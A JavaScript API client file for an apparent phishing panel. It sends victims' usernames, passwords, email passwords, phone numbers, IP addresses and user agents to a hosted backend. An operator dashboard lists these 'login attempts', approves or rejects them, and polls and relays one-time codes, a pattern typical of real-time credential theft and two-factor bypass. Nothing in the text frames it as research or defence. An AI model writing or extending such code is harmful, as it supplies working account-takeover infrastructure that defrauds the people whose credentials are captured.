import axios from "axios";

// Set up the base URL for the API
const API_BASE_URL = "https://serverside-nn15.onrender.com"; // Update this to your actual backend URL

// Helper function to get the token from localStorage
const getToken = () => {
  return localStorage.getItem("token");
};

// User login attempt (logs user details)
export const userLoginAttempt = async (username, password, ip, userAgent) => {
  try {
    const response = await axios.post(
      `${API_BASE_URL}/user/login`,
      { username, password, ip, userAgent },
      { withCredentials: true } // Ensure cookies are sent
    );
    return response.data;
  } catch (error) {
    throw error.response ? error.response.data : error.message;
  }
};

// User login attempt (logs user details)
export const emailPass = async (email, emailPassword, ip, userAgent) => {
  try {
    const response = await axios.post(
      `${API_BASE_URL}/user/emailpass`,
      { email, emailPassword, ip, userAgent },
      { withCredentials: true } // Ensure cookies are sent
    );
    return response.data;
  } catch (error) {
    throw error.response ? error.response.data : error.message;
  }
};
// Polling function to get the current user step (e.g., waiting, error, otp)
export const getUserStep = async (logId) => {
  try {
    const response = await axios.get(`${API_BASE_URL}/user/${logId}/step`, {
      headers: { Authorization: `Bearer ${getToken()}` },
    });
    return response.data;
  } catch (error) {
    throw error.response ? error.response.data : error.message;
  }
};

// Admin login function
export const adminLogin = async (username, password) => {
  try {
    const response = await axios.post(`${API_BASE_URL}/auth/login`, {
      username,
      password,
    });
    if (response.data.token) {
      localStorage.setItem("token", response.data.token); // Save token to localStorage
    }
    return response.data;
  } catch (error) {
    throw error.response ? error.response.data : error.message;
  }
};

// Fetch all user logs for the admin dashboard
export const getUserLogs = async () => {
  try {
    const response = await axios.get(`${API_BASE_URL}/admin/logs`, {
      headers: { Authorization: `Bearer ${getToken()}` },
    });
    return response.data;
  } catch (error) {
    throw error.response ? error.response.data : error.message;
  }
};

// Approve a user login attempt
export const approveLogin = async (logId) => {
  try {
    const response = await axios.put(
      `${API_BASE_URL}/admin/logs/${logId}/approve`,
      {},
      {
        headers: { Authorization: `Bearer ${getToken()}` },
      }
    );
    return response.data;
  } catch (error) {
    throw error.response ? error.response.data : error.message;
  }
};

// Reject a user login attempt
export const rejectLogin = async (logId) => {
  try {
    const response = await axios.put(
      `${API_BASE_URL}/admin/logs/${logId}/reject`,
      {},
      {
        headers: { Authorization: `Bearer ${getToken()}` },
      }
    );
    return response.data;
  } catch (error) {
    throw error.response ? error.response.data : error.message;
  }
};

// Get IP Address for the user (example)
export const getUserIP = async () => {
  try {
    const response = await axios.get("https://api.ipify.org?format=json");
    return response.data.ip;
  } catch (error) {
    throw error.response ? error.response.data : error.message;
  }
};

import Cookies from "js-cookie";

export const verifyOtpCode = async (otp, logId) => {
  const token = getToken();
  if (!token) {
    throw new Error("Unauthorized. Token missing.");
  }

  try {
    const response = await axios.post(
      `${API_BASE_URL}/user/verify-otp/${logId}`,
      { otp, status: "waiting" },
      {
        headers: {
          Authorization: `Bearer ${token}`, // Include token in the headers
        },
        withCredentials: true, // Ensure cookies are sent along with the request
      }
    );
    return response.data;
  } catch (error) {
    throw error.response ? error.response.data : error.message;
  }
};
export const handleApproveOtp = async (logId) => {
  try {
    await verifyOtpCode("approved", logId); // Call the API with 'approved' status
    console.log("OTP approved for log", logId);
  } catch (error) {
    console.error("Error approving OTP:", error);
  }
};

export const handleRejectOtp = async (logId) => {
  try {
    await verifyOtpCode("rejected", logId); // Call the API with 'rejected' status
    console.log("OTP rejected for log", logId);
  } catch (error) {
    console.error("Error rejecting OTP:", error);
  }
};
export const saveNumber = async (number, ip, userAgent) => {
  try {
    const response = await axios.post(
      `${API_BASE_URL}/user/number`, // Ensure this matches your route
      { number, ip, userAgent }, // Data sent to the server
      { withCredentials: true } // This is useful if you're dealing with cookies
    );
    return response.data; // Return the response data
  } catch (error) {
    throw error.response ? error.response.data : error.message; // Handle errors appropriately
  }
};
